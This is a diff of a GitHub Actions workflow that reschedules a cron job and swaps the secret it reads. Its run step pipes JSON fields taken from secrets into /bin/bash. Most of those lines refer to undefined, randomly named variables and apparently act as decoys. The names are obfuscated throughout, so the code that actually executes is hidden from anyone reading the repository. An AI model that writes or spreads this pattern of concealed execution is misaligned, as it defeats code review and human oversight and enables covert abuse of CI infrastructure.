@@ -1,8 +1,9 @@
 name: todaydoylt
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '2 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,20 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: todaydoylt
         env:
-          jz87182: ${{ secrets.jz87182 }}
+          zxt82: ${{ secrets.zxt82 }}
         run: |
-          echo $jz87182 | jq -r .w1072 | /bin/bash
-          echo $wtgug9 | jq -r .me7 | /bin/bash
-          echo $ms4 | jq -r .seux935 | /bin/bash
-          echo $wuk94300 | jq -r .lr31 | /bin/bash
-          echo $asum637 | jq -r .mnoy6088 | /bin/bash
-          echo $rwb91 | jq -r .k010 | /bin/bash
-          echo $v2 | jq -r .bmoh1 | /bin/bash
-          echo $scrx51 | jq -r .kjfyg4458 | /bin/bash
-          echo $yuy5583 | jq -r .tci769 | /bin/bash
-          echo $ct46 | jq -r .ot26 | /bin/bash
-          echo $iyen879 | jq -r .nvsz1 | /bin/bash
-          echo $wsa4 | jq -r .az3411 | /bin/bash
-          echo $xps778 | jq -r .w47 | /bin/bash
-          echo $bavp1 | jq -r .snjzr99 | /bin/bash
+          echo $zxt82 | jq -r .tpj399 | /bin/bash
+          echo $acsa1 | jq -r .xkty11 | /bin/bash
+          echo $dol79550 | jq -r .d6 | /bin/bash
+          echo $yzi86 | jq -r .p3266 | /bin/bash
+          echo $vdh93986 | jq -r .v90730 | /bin/bash
+          echo $htf39 | jq -r .mo325 | /bin/bash
+          echo $uygts47269 | jq -r .etg97255 | /bin/bash
+          echo $iedi97 | jq -r .toslo66203 | /bin/bash
+          echo $kg596 | jq -r .uswpc693 | /bin/bash
+          echo $ymnlg23362 | jq -r .lwqb6893 | /bin/bash
+          echo $wrbg95824 | jq -r .i587 | /bin/bash
+          echo $btu28455 | jq -r .c04 | /bin/bash
+          echo $hter31 | jq -r .dgj26838 | /bin/bash
 
